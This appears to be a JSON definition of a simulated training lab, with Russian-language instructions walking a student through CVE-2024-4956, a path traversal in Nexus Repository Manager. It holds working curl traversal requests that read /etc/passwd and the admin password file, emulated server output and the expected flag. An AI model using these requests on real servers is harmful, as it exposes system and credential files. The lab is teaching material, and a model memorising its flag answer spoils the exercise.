{
  "id": "web-nexus",
  "workdir": "/home/student/task",
  "hostname": "lab",
  "expect": {
    "file": "/home/student/task/found.txt",
    "contains": "nto{n3xus_tr4v3rs4l_adm1n_p4ssw0rd}"
  },
  "fs": [
    {
      "path": "/home/student/task",
      "type": "dir"
    },
    {
      "path": "/home/student/task/task.md",
      "text": "# Практика: Nexus CVE-2024-4956\n\nЦель: `http://nexus.local:8081`.\n\n1. Версия:\n   curl -s http://nexus.local:8081/service/rest/v1/status/check\n\n2. Проверь traversal — прочитай безобидный файл:\n   curl -s 'http://nexus.local:8081/repository/..%2f..%2f..%2f..%2f..%2fetc/passwd'\n\n3. Дочитай до пароля админа:\n   curl -s 'http://nexus.local:8081/repository/..%2f..%2f..%2f..%2f..%2fnexus-data/admin.password'\n\n4. В файле — строка с флагом. Сохрани в found.txt и набери `check`.\n"
    }
  ],
  "tools": {
    "curl": {
      "help": "curl [опции] <url> — HTTP-клиент (эмуляция nexus.local)",
      "cases": [
        {
          "match": "admin\\.password",
          "example": "-s 'http://nexus.local:8081/repository/..%2f..%2f..%2f..%2f..%2fnexus-data/admin.password'",
          "output": "a1b2c3d4-initial-admin-password-nto{n3xus_tr4v3rs4l_adm1n_p4ssw0rd}\n"
        },
        {
          "match": "etc/passwd",
          "example": "-s 'http://nexus.local:8081/repository/..%2f..%2f..%2f..%2f..%2fetc/passwd'",
          "output": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        },
        {
          "match": "status/check",
          "example": "-s http://nexus.local:8081/service/rest/v1/status/check",
          "output": "{\"healthy\":true,\"version\":\"3.68.0\"}\n"
        },
        {
          "match": "status",
          "example": "-s http://nexus.local:8081/service/rest/v1/status",
          "output": "{\"version\":\"3.68.0\",\"edition\":\"OSS\"}\n"
        }
      ],
      "fallback": "curl: в этой лабе эмулируется только nexus.local"
    }
  }
}
